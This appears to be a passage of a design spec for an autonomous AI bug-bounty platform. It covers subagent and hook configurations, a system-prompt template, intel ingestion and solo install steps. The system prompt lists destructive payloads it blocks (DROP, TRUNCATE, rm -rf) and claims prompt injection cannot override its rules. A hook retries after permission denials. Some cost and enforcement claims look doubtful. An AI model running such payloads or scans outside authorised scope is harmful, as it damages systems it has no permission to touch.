| Garak MCP | mcpmarket.com / NVIDIA | 120+ LLM probe modules; run_attack, list_probes | stdio Python | Canonical LLM red-teaming; essential for AI-endpoint assets |
| AutoPentest-AI MCP | bhavsec | 68 MCP tools; OWASP WSTG coverage; 12 WAF evasions | stdio Python | OWASP-structured methodology; 68 tools organized by test case |
| Strix MCP | usestrix | Deep mode 2000+ steps; 17 skill files; Caido+Playwright | stdio Python | Highest-quality open-source pentest framework; Deep mode chaining |
| Tencent AI-Infra-Guard MCP | Tencent | 14 MCP risk categories; 589+ CVEs; agent scan; jailbreak eval | stdio Python | Best MCP-specific security scanner; Black Hat Europe 2025 Arsenal |
| MCP-Scan | multiple | Static + dynamic MCP server vuln scanning | stdio Python | Defense: scan our own MCP servers for vulnerabilities |

### Built In-House MCPs

| MCP Server | Language | Key Tools | Purpose |
|---|---|---|---|
| `scope-mcp` | TypeScript | check_target, list_in_scope_assets, issue_scope_jwt, revoke_scope_jwt, get_scope_changes, rank_programs | Scope enforcement, JWT issuance, EV ranking |
| `ev-mcp` | TypeScript | rank_programs, score_program, get_program_details, compute_freshness | EV scoring engine |
| `oracle-mcp` | Python | oracle_xss, oracle_ssrf_oast, oracle_sqli_timing, oracle_ssti_sandbox, oracle_idor_matrix, oracle_open_redirect, oracle_rce_sandbox, oracle_ssrf_imds | Deterministic verification oracle |
| `evidence-mcp` | Python | put_artifact, get_artifact, checkpoint, list_artifacts | Content-addressable evidence store |
| `dedup-mcp` | Python | check_similarity, find_duplicates, embed_finding | pgvector semantic deduplication |
| `kev-mcp` | TypeScript | get_recent_kev, match_program, get_epss, alert_on_new_kev | CISA+VulnCheck KEV integration |
| `h1-mcp` | TypeScript | list_programs, get_program, get_org_assets, submit_report, get_report_status | HackerOne API (post-April 2026 org assets) |
| `bugcrowd-mcp` | TypeScript | list_programs, get_target_groups, submit_report, get_vrt | Bugcrowd API |
| `intigriti-mcp` | TypeScript | list_programs, get_scopes, submit_report, get_tier_info | Intigriti API |
| `immunefi-mcp` | TypeScript | list_programs, get_impacts, submit_report | Immunefi API (no auth required) |

## 7.4 Sample Subagent Definition File

```markdown
---
name: validator-agent
description: |
  Independent PoC reproduction and deterministic validation oracle.
  Re-runs every candidate exploit from a clean Firecracker sandbox and
  returns a verdict. Use ONLY for findings in status exploit_candidate.
  Must use a different model than the exploit-agent. Has no access to
  the exploit-agent's reasoning transcript.
model: claude-sonnet-4-6
color: green
maxTurns: 20
permissionMode: default
tools:
  - mcp__oracle-mcp__oracle_xss
  - mcp__oracle-mcp__oracle_ssrf_oast
  - mcp__oracle-mcp__oracle_sqli_timing
  - mcp__oracle-mcp__oracle_ssti_sandbox
  - mcp__oracle-mcp__oracle_idor_matrix
  - mcp__oracle-mcp__oracle_open_redirect
  - mcp__oracle-mcp__oracle_rce_sandbox
  - mcp__oracle-mcp__oracle_ssrf_imds
  - mcp__evidence-mcp__put_artifact
  - mcp__evidence-mcp__get_artifact
  - mcp__state__query_artifacts
  - mcp__state__update_finding_status
  - Read
hooks:
  PreToolUse:
    - matcher: "mcp__oracle-mcp__.*"
      hooks:
        - type: command
          command: "$BS_HOME/hooks/scope_enforce.py"
  PostToolUse:
    - matcher: "mcp__oracle-mcp__.*"
      hooks:
        - type: command
          command: "$BS_HOME/hooks/evidence_capture.py"
---

You are the BountyStrike validator. You are deliberately skeptical.

Your only input is a Finding object with `poc`, `cwe`, and `target`.
You do NOT see the exploit-agent's scratchpad or reasoning.

Protocol for each finding:
1. Identify the CWE class and select the appropriate oracle.
2. Call the oracle with the exact PoC (no modifications).
3. Interpret the oracle result per the verdict schema.
4. If verdict = "unreproducible", retry at most TWICE with variations
   (different timing window, different payload encoding). Document each attempt.
5. If all attempts fail: verdict = "unreproducible".
6. If 1 of 3 attempts succeeds: verdict = "flaky" — requires T2 escalation.
7. Write the ValidationResult to evidence store.
8. Update finding status via mcp__state__update_finding_status.
9. Perform cleanup: verify no test artifacts remain on target.

You are the last line of defense against false positives.
A rejected false positive saves the operator from program banning.
A missed true positive costs at most one bounty.
Default to rejection when uncertain.
```

## 7.5 Hook Configurations

```json
// .claude/settings.json (production)
{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/verify_attestation.py"},
          {"type": "command", "command": "$BS_HOME/hooks/load_scope.py"},
          {"type": "command", "command": "$BS_HOME/hooks/inject_api_keys.py"}
        ]
      }
    ],
    "PreToolUse": [
      {
        "matcher": "mcp__*__*",
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/killswitch_check.py"},
          {"type": "command", "command": "$BS_HOME/hooks/scope_enforce.py"},
          {"type": "command", "command": "$BS_HOME/hooks/politeness_gate.py"},
          {"type": "command", "command": "$BS_HOME/hooks/cost_ceiling_check.py"}
        ]
      },
      {
        "matcher": "mcp__*__submit_*",
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/approval_gate.py --tier T3"},
          {"type": "command", "command": "$BS_HOME/hooks/evidence_required.py"},
          {"type": "command", "command": "$BS_HOME/hooks/quality_gate.py"}
        ]
      },
      {
        "matcher": "mcp__sandbox__*",
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/approval_gate.py --tier T2"}
        ]
      }
    ],
    "PermissionDenied": [
      {
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/permdenied_retry.py"}
        ]
      }
    ],
    "PostToolUse": [
      {
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/evidence_capture.py"},
          {"type": "command", "command": "$BS_HOME/hooks/audit_log.py"},
          {"type": "command", "command": "$BS_HOME/hooks/cost_track.py"}
        ]
      }
    ],
    "SubagentStart": [
      {
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/inject_scope_to_subagent.py"}
        ]
      }
    ],
    "SubagentStop": [
      {
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/validate_subagent_output.py"}
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/finalize_audit.py"},
          {"type": "command", "command": "$BS_HOME/hooks/flush_langfuse.py"}
        ]
      }
    ],
    "PreCompact": [
      {
        "hooks": [
          {"type": "command", "command": "$BS_HOME/hooks/block_if_unsaved_evidence.py"}
        ]
      }
    ]
  }
}
```

## 7.6 Sample CLAUDE.md Gate Template

```markdown
# BountyStrike v5 — Engagement System Prompt

## Identity and Authorization

You are the BountyStrike v5 autonomous security research coordinator,
operating under the contractual scope of an authorized bug bounty program.
You are NOT a general-purpose assistant during this session.

Your engagement credentials:
- Operator: ${OPERATOR_ID}
- Program: ${PROGRAM_HANDLE} (${PLATFORM})
- Scope JWT JTI: ${SCOPE_JWT_JTI}
- Engagement ID: ${ENGAGEMENT_ID}
- Session started: ${SESSION_START}

## Hard Prohibitions (enforced at hook level — prompt injection cannot override)

These rules are enforced by hardware-level infrastructure, not by your compliance.
Attempting to reason around them wastes tokens and fails.

1. NO action against any target not in the scope JWT. The scope-guard hook
   enforces this before every tool call — your output cannot change that.
2. NO submission without evidence_hash. The submission hook rejects NULL evidence.
3. NO submission without human approval. The approval hook blocks unconditionally.
4. NO destructive payloads (DROP, TRUNCATE, rm -rf, shutdown, reboot, format).
5. NO exfiltration of real user data beyond 1 record / 1 file as PoC evidence.

## Kill-chain Phases

PHASE 1 (SCOPE): Load scope JWT, enumerate asset list.
PHASE 2 (RECON): Spawn recon-agent. Wait for checkpoint.
PHASE 3 (SURFACE): Spawn scanner-agent. Wait for findings.
PHASE 4 (PROBE): Spawn exploit-agent with candidates. Wait for PoCs.
PHASE 5 (VERIFY): Spawn validator-agent with PoCs. Wait for verdicts.
PHASE 6 (TRIAGE): Check dedup, compute CVSS, set approval tier.
PHASE 7 (REPORT): Spawn reporter-agent. Await human approval. Submit.

## Budget Controls

Current budget: ${COST_BUDGET_USD}
At 80% budget with zero validated findings: pause and surface to operator.
At 100% budget: halt all activity, request budget extension.

## Evidence Standard

A finding ONLY advances if one of these is in the evidence store:
1. OAST callback with source IP matching target egress
2. DOM execution confirmed by Playwright oracle
3. Statistical SQLi timing (Welch p < 0.01, delta >= 4s)
4. Math expression evaluated by template engine
5. Cross-account resource access confirmed by access matrix test
```

## 7.7 Slash Commands

| Command | File | Description |
|---|---|---|
| `/scope <program>` | `.claude/commands/scope.md` | Load program scope, display EV score and top candidates |
| `/recon <target>` | `.claude/commands/recon.md` | Run recon-agent on a single target or program |
| `/scan <program>` | `.claude/commands/scan.md` | Full scan pipeline: recon → scanner → exploit → validate |
| `/triage <finding-id>` | `.claude/commands/triage.md` | Review a specific finding, run dedup, set approval tier |
| `/submit <finding-id>` | `.claude/commands/submit.md` | Initiate report generation and submission workflow |
| `/cost` | `.claude/commands/cost.md` | Show current session LLM cost breakdown |
| `/halt` | `.claude/commands/halt.md` | Activate kill switch (T1/T2/T3 options) |
| `/benchmark` | `.claude/commands/benchmark.md` | Run the platform against Cybench/XBOW-104 test suite |

---

# Part 8 — Cross-Source Ingestion Pipeline

## 8.1 Source Inventory

The cross-source ingestion pipeline aggregates intelligence from 13 source types, each contributing distinct signal to the platform's situational awareness:

| Source | Connector | Cadence | Primary Signal |
|---|---|---|---|
| Web (general) | WebFetch + rate-limited crawler | On-demand | Target reconnaissance, JS analysis |
| Apify/Pipedream | `apify__pipedream` | Hourly | Reddit r/netsec, X/Twitter, YouTube, blogs, disclosure posts |
| Google Drive | `google_drive` MCP | Daily | Private intel documents, notes, prior engagement artifacts |
| Scholar (arXiv) | `scholar` MCP | Daily | New papers on CVEs, attack techniques, benchmark results |
| Google Calendar | `gcal` MCP | Real-time | Engagement scheduling, disclosure deadlines, program events |
| YouTube Analytics | `youtube_analytics` | Weekly | Signal mining: conference talks, PoC demo videos |
| Vercel | `vercel` MCP | On-deploy | Platform deployment status, edge function analysis |
| Supabase | `supabase` MCP | Real-time | Data plane (findings, evidence) when Supabase is used as DB |
| GitHub (MCP direct) | `github_mcp_direct` | On-event | CVE PoC repos, nuclei template PRs, scope change detection |
| CISA KEV | REST polling | Continuous | Known-exploited vulnerability feed |
| EPSS (First.org) | REST polling | Daily | Exploitation probability scores |
| VulnCheck | REST polling | Continuous | Extended KEV + enriched CVE data |
| GreyNoise | REST polling | Real-time | Internet noise classification; active scanning detection |

## 8.2 Per-Source Extractors

### 8.2.1 Apify/Pipedream — Social Intelligence

The `apify__pipedream` connector aggregates social intelligence from multiple platforms via Apify scrapers and Pipedream automation workflows. Rate limits: Reddit 60 req/min, X API 1500 req/15min (Basic), YouTube Data API 10,000 units/day.

Extraction pipeline per source:
```python
class ApifyExtractor:
    async def extract_reddit_security(self, subreddits: list[str]) -> list[IntelItem]:
        """
        Monitor r/netsec, r/bugbounty, r/netsecstudents, r/hacking for:
        - New CVE discussions with PoC links
        - Bug bounty writeups with technique descriptions
        - Tool release announcements
        - Program behavior changes ("acme corp rejected my report")
        """
        items = await self.apify_client.run_actor(
            "reddit-scraper",
            input={
                "subreddits": subreddits,
                "searchQuery": "CVE OR bug bounty OR RCE OR SSRF OR zero-day",
                "maxItems": 200,
                "timeFilter": "day"
            }
        )
        return [self.normalize_reddit_item(i) for i in items]
    
    async def extract_twitter_security(self, query: str) -> list[IntelItem]:
        """
        Monitor X/Twitter for:
        - @HackerOne program announcements
        - Security researcher disclosure tweets
        - CVE PoC hashtags (#CVE, #0day, #bugbounty)
        - Vendor security advisories
        """
        pass  # Implementation via Pipedream Twitter actor
    
    async def extract_youtube_security(self) -> list[IntelItem]:
        """
        Monitor for new videos from:
        - Security conference channels (DEF CON, Black Hat, OWASP)
        - Bug bounty researcher channels
        - CVE PoC demonstration videos
        """
        pass
```

Dedup: Before embedding and indexing, each item is checked against a bloom filter of processed item IDs (48-hour TTL). Items that pass the bloom filter are processed; items that fail are silently dropped (already seen).

### 8.2.2 GitHub MCP Direct — CVE/PoC Intelligence

The `github_mcp_direct` connector monitors specific GitHub repositories for events that trigger platform actions:

```yaml
# github-intelligence.yml — monitored repositories and triggers
repositories:
  - repo: "projectdiscovery/nuclei-templates"
    events: ["push"]
    filter: "path:cves/"
    action: "ingest_nuclei_template"
    
  - repo: "trickest/cve"
    events: ["push"]
    filter: "path:*.md OR path:*.py"
    action: "ingest_cve_poc"
    
  - repo: "arkadiyt/bounty-targets-data"
    events: ["push"]
    filter: "path:data/"
    action: "trigger_scope_ingest"
    
  - repo: "rix4uni/scope"
    events: ["push"]
    filter: "path:newdata_inscope_wildcards.txt"
    action: "trigger_scope_change_event"
    
  - repo: "cisagov/kev-data"
    events: ["push"]
    action: "trigger_kev_alert"
```

On a new nuclei template commit to `projectdiscovery/nuclei-templates/cves/`, the platform:
1. Fetches the new template YAML
2. Extracts CVE ID, affected product, and detection method
3. Cross-references against the Trickest CVE inventory to determine if a template gap exists
4. Scores CVE opportunity using `cve_opportunity_score_with_decay()` (EPSS × kev_freshness × template_factor)
5. Stores result in `kev_entries` table linked to affected programs
6. Triggers KEV alert flow if score > 0.3 (operator notification + autonomous PoC draft)

### 8.2.3 Google Drive — Private Intel Repository

The `google_drive` connector ingests from a designated drive folder (`BountyStrike/Intel/`) that the operator uses to accumulate private non-public intelligence:

- Retainer agreements with per-program notes and target metadata
- Conference slides from invite-only security events
- Custom nuclei template YAML before public contribution
- Per-program historical submission notes (what worked, what triagers rejected)

Ingestion runs hourly with a `modified_after` filter to catch only changed documents. Content is extracted via the Drive API's export-as-text endpoint (for Google Docs) or direct file download (for PDFs and Markdown). Extracted content feeds the embedding pipeline with `source=private_intel` tag, which means dedup uses the pgvector cosine similarity path for semantic overlap rather than exact hash matching.

### 8.2.4 Scholar / arXiv — Academic Intelligence

The `scholar` connector polls arXiv's `cs.CR` category (Computer Science → Cryptography and Security) for papers published in the last 72 hours matching a curated keyword set:

```python
ARXIV_KEYWORDS = [
    "vulnerability", "exploit", "bug bounty", "penetration testing",
    "web security", "prompt injection", "LLM security", "agent security",
    "CVE", "zero-day", "fuzzing", "symbolic execution", "patch analysis",
    "memory safety", "SQL injection", "XSS", "SSRF", "IDOR",
    "authentication bypass", "authorization", "AI red team"
]
```

Each matched paper is parsed for abstract + methodology. Papers matching the exploit-techniques pattern (new attack technique, new tool, benchmark with > 50% improvement) are escalated to a `HIGH_PRIORITY` queue that triggers an immediate daily brief insertion rather than waiting for the 06:00 UTC batch.

The academic intelligence is valuable not just for staying current but for informing the exploit-agent's reasoning. When the platform identifies a new attack technique from an arXiv paper (e.g., the CHECKMATE classical-planner approach to attack planning, or the AgentFlow typed-graph DSL for multi-agent orchestration), it generates a "technique card" stored in the skills library that the exploit-agent can retrieve via RAG.

### 8.3 Embedding Pipeline

All ingested content flows through a unified embedding pipeline before pgvector indexing:

```
Raw text
    │
    ▼
Chunker (512 tokens, 50-token overlap, sentence-boundary-aware)
    │
    ▼
Embedder:
    - Primary: text-embedding-3-large (1536d) via OpenAI API
    - Fallback: Qwen3-Embedding-8B (self-hosted, 4096d) via local vLLM
    - Solo mode: nomic-embed-text (768d, Ollama, free)
    │
    ▼
pgvector INSERT into intel_chunks table:
    - chunk_id (UUID)
    - content (text)
    - embedding (vector)
    - source (string: "apify_reddit" | "github_cve" | "private_intel" | "scholar")
    - item_id (FK to intel_items)
    - created_at (timestamp)
    - ttl_days (integer, default 90)
```

**Index strategy:** The `intel_chunks` table uses `pgvectorscale`'s DiskANN index for approximate nearest-neighbor search with recall > 99% at 10ms p99 latency. For the solo deployment (< 500K chunks), HNSW is sufficient and requires no additional license. For SaaS deployments with > 5M chunks per tenant, Turbopuffer provides dedicated vector namespaces with tenant-isolated billing.

### 8.4 Daily Intelligence Brief Generation

At 06:00 UTC every day, the platform generates a `DailyBrief` for each registered operator. The brief generation workflow runs as a Hatchet cron task (solo) or Temporal scheduled workflow (SaaS):

```python
async def generate_daily_brief(operator_id: str, date: datetime) -> DailyBrief:
    """
    Synthesizes the past 24h of intelligence into an operator-readable brief.
    Uses Sonnet 4.6 for synthesis (quality matters here, this is what the
    operator reads every morning).
    """
    # Collect events from the past 24 hours
    new_kevs = await fetch_new_kev_entries(since=date - timedelta(hours=24))
    high_epss = await fetch_high_epss_cves(threshold=0.7, since=date - timedelta(hours=24))
    scope_changes = await fetch_scope_changes(operator_id, since=date - timedelta(hours=24))
    community_signals = await fetch_community_intel(since=date - timedelta(hours=24))
    
    # Cross-reference KEVs with operator's active programs
    kev_matches = await cross_reference_kev_with_programs(operator_id, new_kevs)
    
    # Score by operator impact (programs they're actively hunting)
    actionable = sorted(
        kev_matches + high_epss + scope_changes,
        key=lambda x: x.operator_impact_score,
        reverse=True
    )[:20]  # top 20 items
    
    # Synthesize with Sonnet 4.6
    prompt = f"""
    Generate a concise daily intelligence brief for a security researcher.
    
    Format:
    ## Critical Actions (next 24h)
    [Actionable items ranked by time-sensitivity × impact]
    
    ## New KEV Entries Affecting Your Programs
    [KEV additions cross-referenced with hunter's active programs]
    
    ## Scope Changes
    [New targets, expanded wildcards, recently added programs]
    
    ## Community Signals
    [Techniques researchers are discussing, program-specific intel]
    
    ## Academic Highlights
    [New papers with immediately applicable attack techniques]
    
    Raw intelligence:
    {json.dumps([a.to_dict() for a in actionable], indent=2)}
    """
    
    response = await openrouter_complete(
        model="anthropic/claude-sonnet-4-6",
        prompt=prompt,
        max_tokens=2000
    )
    
    brief = DailyBrief(
        operator_id=operator_id,
        date=date,
        content=response.content,
        critical_actions=[a for a in actionable if a.urgency == "critical"],
        kev_matches=kev_matches,
        scope_changes=scope_changes,
    )
    
    await store_brief(brief)
    await notify_operator(operator_id, brief)  # Slack/email/webhook
    
    return brief
```

### 8.5 New-CVE Alert Flow

The most time-critical path in the ingestion pipeline is the new CVE/KEV alert. When CISA adds a CVE to the Known Exploited Vulnerabilities catalog, the first-mover advantage decays exponentially (μ = 0.00963, half-life ≈ 72 hours per [research/program_selection.md §11.2]; hand-tuned heuristic constant, pending empirical calibration). The platform must react in minutes, not hours.

**Alert event chain:**

```
CISA KEV JSON polled every 15 minutes (Hatchet cron)
    │
    ▼ (new entry detected)
KEV entry stored in kev_entries table
    │
    ▼
Cross-reference with programs:
    - Query tech_stack_fingerprints for programs using affected software
    - Query nuclei_templates index for existing template coverage
    - Score: kev_freshness(age_minutes/60) × P(program_uses_product)
    │
    ▼ (score > 0.3 → alert threshold)
Alert event published to NATS/Hatchet event bus
    │
    ▼
Two parallel downstream handlers:
    ├── NOTIFY: Push to operator Slack/Discord/ntfy.sh within 2 minutes
    └── DRAFT_POC: Spawn exploit-agent with limited scope:
            - target: "CVE-YYYY-NNNNN PoC research (no live targets)"
            - tools: WebFetch, scholar search, github code search
            - goal: "Locate public PoC references, nuclei template, patch diff"
            - output: "poc_research_note" stored in intel_items
    │
    ▼ (if poc_research_note found AND operator_has_affected_program)
Escalate to T1 approval:
    - Operator reviews poc_research_note
    - One-click "start targeted scan" against affected program scope
    - Scan pre-loaded with CVE-specific nuclei template + PoC request
```

This flow is designed to give an individual hunter a 30-60 minute head start over researchers who rely on manual CVE monitoring — enough to be first on a high-value program. The escalation to T1 approval (operator one-click) rather than fully autonomous scanning ensures the operator stays in the loop on any live target engagement triggered by a new CVE. The evidence standard does not change: a CVE alert does not become a submitted finding until the deterministic verifier confirms exploitation against the actual target.

---

# Part 9 — Deployment Modes

## 9.1 Solo Hacker Deployment

### 9.1.1 Design Philosophy

The solo deployment is not a stripped-down version of the SaaS platform — it is a first-class deployment target with different cost and operations constraints. The guiding principle is: **a single operator on a Mac mini or laptop should be able to run the full platform for under $30/month in infrastructure costs, with bounty payouts as the only meaningful income line**.

This drives several concrete decisions:
- Postgres in Docker (not RDS): no managed DB cost, sufficient for single-operator workloads
- Hatchet workflow engine (single binary, Postgres-backed): eliminates the Temporal Cloud subscription
- microsandbox or Firecracker locally: no E2B API cost for sandboxed tool execution
- DeepSeek V4-Flash as the primary model ($0.14 cache-miss input / $0.0028 cache-hit input / $0.28 output per MTok; per api-docs.deepseek.com; see docs/bountystrike_v6_phase0-1_technical_brief.md — corrects the v6 figure): enables sub-$0.20 full scans at high cache-hit rates
- BYOK Anthropic via the 1M free requests/month tier: Claude for premium tasks at zero marginal cost
- Caddy reverse proxy + ngrok (or Cloudflare Tunnel): no dedicated load balancer
- Cloudflare R2 for artifact storage: zero egress cost tier

### 9.1.2 Infrastructure Stack

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  Mac mini M4 or Linux laptop (16GB RAM minimum, 512GB NVMe)                  │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │  Docker Compose (core services)                                      │    │
│  │                                                                      │    │
│  │  postgres:17  ◄──── pgvector + pgvectorscale + ParadeDB extensions  │    │
│  │  redis:8.0    ◄──── kill switch flag + session cache                │    │
│  │  hatchet      ◄──── workflow engine (single binary, Postgres-backed) │   │
│  │  caddy        ◄──── HTTPS reverse proxy + LetsEncrypt               │    │
│  │  langfuse     ◄──── LLM observability (self-hosted)                 │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │  Scan execution (hardened Docker, per-job containers)                │    │
│  │                                                                      │    │
│  │  recon-worker     ◄── subfinder, dnsx, httpx, katana, gau, wayback  │    │
│  │  nuclei-worker    ◄── nuclei with curated template sets              │    │
│  │  exploit-worker   ◄── microsandbox / Firecracker microVMs (local)   │    │
│  │  validator-worker ◄── Playwright headless, interactsh-client         │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │  Agent runtime (Claude Code CLI + Agent SDK)                         │    │
│  │                                                                      │    │
│  │  claude -p headless   ◄── BYOK Anthropic key (1M free/month)        │    │
│  │  OpenRouter gateway   ◄── DeepSeek V4-Flash, Qwen3-Coder, Venice    │    │
│  │  MCP servers (stdio)  ◄── scope-mcp, ev-mcp, oracle-mcp, h1-mcp     │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │  Network egress control                                              │    │
│  │                                                                      │    │
│  │  iptables / pf rules: allow only scope-JWT-approved IP ranges        │    │
│  │  Burp Suite Community proxy (localhost:8080, audit trail)            │    │
│  │  ngrok / Cloudflare Tunnel (OAST callback listener)                  │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                                                              │
│  Cloudflare R2 (zero egress) ◄── screenshots, HTTP responses, evidence      │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 9.1.3 Step-by-Step Installation

#### Prerequisites

```bash
# macOS (Homebrew-based)
brew install go python@3.12 node@22 rust docker colima
brew install subfinder httpx dnsx naabu katana nuclei interactsh

# Install uv for Python package management (fastest Python installer)
curl -LsSf https://astral.sh/uv/install.sh | sh

# Install Claude Code CLI
npm install -g @anthropic-ai/claude-code

# Install Claude Agent SDK
pip install claude-agent-sdk

# Install bbscope v2
go install github.com/sw33tLie/bbscope@latest

# Install projectdiscovery tools bulk
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest

# Pull nuclei templates
nuclei -update-templates

# Linux (Ubuntu 24.04)
sudo apt-get install -y golang nodejs python3.12 docker.io
# Then same go install commands above
```

#### Docker Compose Setup

```yaml
# docker-compose.yml — solo mode
version: "3.9"

services:
  postgres:
    image: pgvector/pgvector:pg17
    environment:
      POSTGRES_DB: bountystrike
      POSTGRES_USER: bs
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./infra/sql/init.sql:/docker-entrypoint-initdb.d/init.sql
    ports:
      - "5432:5432"
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U bs -d bountystrike"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:8.0-alpine
    command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD}
    volumes:
      - redis_data:/data
    ports:
      - "6379:6379"

  hatchet:
    image: ghcr.io/hatchet-dev/hatchet-engine:latest
    environment:
      DATABASE_URL: postgresql://bs:${POSTGRES_PASSWORD}@postgres:5432/bountystrike
      SERVER_GRPC_PORT: 7070
      SERVER_PORT: 8080
      SERVER_AUTH_COOKIE_SECRETS: ${HATCHET_COOKIE_SECRET}
    depends_on:
      postgres:
        condition: service_healthy
    ports:
      - "7070:7070"
      - "8080:8080"

  langfuse:
    image: langfuse/langfuse:latest
    environment:
      DATABASE_URL: postgresql://bs:${POSTGRES_PASSWORD}@postgres:5432/bountystrike
      NEXTAUTH_SECRET: ${LANGFUSE_SECRET}
      NEXTAUTH_URL: http://localhost:3000
      SALT: ${LANGFUSE_SALT}
    depends_on:
      postgres:
        condition: service_healthy
    ports:
      - "3000:3000"

  caddy:
    image: caddy:2-alpine
    volumes:
      - ./infra/Caddyfile:/etc/caddy/Caddyfile
      - caddy_data:/data
    ports:
      - "80:80"
      - "443:443"
    depends_on:
      - hatchet
      - langfuse

volumes:
  postgres_data:
  redis_data:
  caddy_data:
```

#### Environment Configuration

```bash
# .env.local — copy to .env and fill in
POSTGRES_PASSWORD=<generate: openssl rand -base64 32>
REDIS_PASSWORD=<generate: openssl rand -base64 32>
HATCHET_COOKIE_SECRET=<generate: openssl rand -base64 32>
LANGFUSE_SECRET=<generate: openssl rand -base64 32>
LANGFUSE_SALT=<generate: openssl rand -base64 32>

# API keys
ANTHROPIC_API_KEY=sk-ant-...   # BYOK — 1M requests/month free
OPENROUTER_API_KEY=sk-or-...   # For DeepSeek V4-Flash, Venice, Qwen3-Coder

# Platform auth tokens
H1_API_TOKEN=...
H1_USERNAME=...
BUGCROWD_SESSION_COOKIE=...    # Refresh monthly
INTIGRITI_PAT=...
YESWEHACK_BEARER=...

# Scope JWT signing
SCOPE_JWT_PRIVATE_KEY_PATH=./keys/scope_jwt_rs256_private.pem
SCOPE_JWT_PUBLIC_KEY_PATH=./keys/scope_jwt_rs256_public.pem

# Cloudflare R2
R2_BUCKET=bountystrike-evidence
R2_ACCOUNT_ID=...
R2_ACCESS_KEY_ID=...
R2_SECRET_ACCESS_KEY=...

# OAST callback listener
INTERACTSH_SERVER_URL=https://oast.pro
INTERACTSH_AUTH=...

# Optional: Burp Suite Collaborator (Professional license)
BURP_COLLABORATOR_URL=https://burpcollaborator.net
```

#### First Launch

```bash
# Generate scope JWT keypair
mkdir -p keys
openssl genrsa -out keys/scope_jwt_rs256_private.pem 4096
openssl rsa -in keys/scope_jwt_rs256_private.pem -pubout -out keys/scope_jwt_rs256_public.pem

# Start core services
docker compose up -d postgres redis hatchet

# Wait for Postgres to be healthy, then run migrations
sleep 10
psql postgresql://bs:${POSTGRES_PASSWORD}@localhost:5432/bountystrike < infra/sql/schema.sql
psql postgresql://bs:${POSTGRES_PASSWORD}@localhost:5432/bountystrike < infra/sql/seed_weights.sql

# Start full stack
docker compose up -d

# Verify health
curl http://localhost:8080/healthz  # Hatchet
curl http://localhost:3000/api/public/health  # Langfuse

# Register Hatchet workflows
cd workers && python register_workflows.py

# Trigger initial scope ingest (manually)
python -m bountystrike.workers.scope_ingest --platform all --initial

# Verify scope loaded
psql postgresql://bs:${POSTGRES_PASSWORD}@localhost:5432/bountystrike \
  -c "SELECT platform, count(*) FROM programs GROUP BY platform;"

# Start your first scan
bountystrike scan --program hackerone/target-program --profile solo_aggressive
```

### 9.1.4 Solo Cost Model

The solo deployment is designed to cost under $30/month in infrastructure with bounty revenue covering all LLM costs:

| Cost Category | Monthly Estimate | Notes |
|---|---|---|
| Cloudflare R2 | $0 | Free up to 10M Class A ops + 10GB storage |
| Cloudflare Tunnel | $0 | Free for personal use |
| Docker / Colima (local) | $0 | Runs on your existing hardware |
| Hatchet (self-hosted) | $0 | Open source, Postgres-backed |
| Langfuse (self-hosted) | $0 | Open source |
| BYOK Anthropic (Sonnet 4.6) | $0 | 1M requests/month free tier |
| OpenRouter (DeepSeek V4-Flash) | ~$4–10 | Most scans; $0.14 cache-miss / $0.28 output per MTok (cache-hit $0.0028 input) (per api-docs.deepseek.com; see docs/bountystrike_v6_phase0-1_technical_brief.md — corrects the v6 figure) |
| OpenRouter (Qwen3-Coder, Venice) | ~$1–3 | Exploit gen, payload synthesis |
| interactsh-client (self-hosted) | $0 | OAST with open source server |
| HackerOne/Bugcrowd API | $0 | Free API access |
| **Total infrastructure** | **<$10/month** | — |
| **Per-scan cost (single target)** | **$0.08–0.20** | DeepSeek-heavy routing |
| **Premium scan cost (full suite)** | **$0.50–1.50** | Sonnet 4.6 + Opus 4.7 for complex chains |

The key cost driver is model selection. Using DeepSeek V4-Flash ($0.14 cache-miss input / $0.0028 cache-hit input / $0.28 output per MTok; per api-docs.deepseek.com; see docs/bountystrike_v6_phase0-1_technical_brief.md — corrects the v6 figure) for triage, dedup, and intermediate reasoning, reserving Sonnet 4.6 for report writing and Opus 4.7 for complex exploit chaining via BYOK, the total per-scan cost is well under $0.20 for most targets when cache-hit rates are high. A single $500 bounty pays for hundreds of scans.

### 9.1.5 Solo-Mode Kill Switch

```bash
# Three-layer kill switch (from redis flag + hook + supervisor)

# Layer 1: Redis flag — instant, no LLM involvement
redis-cli SET bountystrike:killswitch:global 1 EX 86400  # 24h TTL

# Layer 2: PreToolUse hook checks the flag before every tool execution
# (already embedded in pretool_scope_guard.py)

# Layer 3: Process supervisor signal
pkill -SIGTERM -f "claude -p"   # graceful stop
# OR
pkill -SIGKILL -f "claude -p"  # immediate stop

# Check kill switch status
bountystrike status --killswitch
```

